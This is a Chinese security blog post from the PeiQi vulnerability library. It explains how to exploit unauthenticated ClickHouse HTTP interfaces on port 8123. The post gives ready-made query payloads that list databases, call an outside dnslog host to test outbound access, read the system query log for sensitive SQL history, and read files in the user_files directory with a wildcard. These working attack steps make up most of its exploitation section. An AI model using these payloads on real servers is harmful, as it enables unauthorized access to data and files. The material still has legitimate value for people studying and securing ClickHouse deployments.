> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xIc3Ic7N104iTogZul1LJA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**默认情况下，clickhouse-server 会在 8123 端口上监控 HTTP 请求（这可以在配置中修改）。**

```
如果你发送了一个未携带任何参数的GET /请求，它会返回一个字符串 «Ok.»（结尾有换行）。可以将它用在健康检查脚本中。
如果你发送了一个未携带任何参数的GET /请求，它返回响应码200和OK字符串定义，可在Http服务响应配置定义(在末尾添加换行)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdIfEooBkHtZ5IRuFmviaX07WC9n1OWG0jpXQoPBYJGMDTFaV0ZPsGMpg/640?wx_fmt=png)

这里可以看到 ClickHouse 存在着的接口由于没有鉴权，则任意访问者都可以执行 SQL 语句获取数据

**二：利用方式🐑**

首先确定是否使用了 ClickHouse 数据库的接口

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTd84Aetgf9dDQyu5EOzB29ksib9ChuXlWYnEhz1fQdxSIFCHBmbr5H8FQ/640?wx_fmt=png)

**根据文档得知，正常返回为 Ok. , 且存在 X-ClickHouse-Summary 作为返回包的 Header**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdy5HPXibiaXZp0tPE9TtSI5pFp5O6meoZL4IW8RyoBLEAVEq09NhYMAvg/640?wx_fmt=png)

测试是否可以执行 SQL 命令, 部分会开启身份验证导致未授权执行失败

```
/?query=SHOW%20DATABASES
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdp5I0rAQMFOEDibCDt0kgSHPQ8vkxs5o8UCRBGPqrpmoUaHCQzZuA5Rg/640?wx_fmt=png)

成功执行语句获取数据，执行其他命令探测出网

```
/?query=SELECT%20*%20FROM%20url('http://jahl09.dnslog.cn','txt','column1%20UInt32')%20LIMIT%202
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdXhGGmPAhP2UhZDwP1QjfxJ1t4Q8UqutjibpMqVCEyc3dGfn3fic1kXkw/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdgKQjc1lvVS38MN4vhFI5fCGBEbRLcIJjSwNn5vkSlpMkvmVl84ynYA/640?wx_fmt=png)

其中也可以查看 system 库中的执行记录表来获取最近执行的所有 SQL 语句来快速定位可利用的信息

(获取敏感用户信息，数据库名以及数据表名)

```
/?query=SELECT%20*%20FROM%20system.query_thread_log
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdiab3icngq1LFdE0HUPNpYeufUDmtdqbwCDTX2dCn91SdyVmq4VMibbAdQ/640?wx_fmt=png)

由于默认配置中的可读路径默认 

(**配置文件位置：/etc/clickhouse-server/config.xml**)

因此只能读取下面路径中的文件，当目标中曾在该路径导入文件且没有删除的情况下，可通过测试获取敏感文件信息，获取数据文件

**/var/lib/clickhouse/user_files/**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTd4YjpulicT8f3hX29kHiaKJiclQKSDFEamRkQe3ACWNB19ZibjfMia24VreA/640?wx_fmt=png)

其中读取时可以利用通配符跳过不知道文件名的情况获取文件信息

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdKWXCxf98E7ScBJSlicia6b9wfZ2GkSVicm8G0NdWbr1oU3VWeibSrIRyDA/640?wx_fmt=png)

```
/?query=SELECT%20*%20FROM%20file('*'%2C%20'CSV'%2C%20'column1%20String%2C%20column2%20String%2C%20column3%20String')%20LIMIT%203%3B"
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el747jKeLHLp9AibBMXuqNKTdjBEia1qOWI9bOuev8XG9NH1dpKPNQGnllscORQoeJ5o1xXZa28P9Wgw/640?wx_fmt=png)

 ****四:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**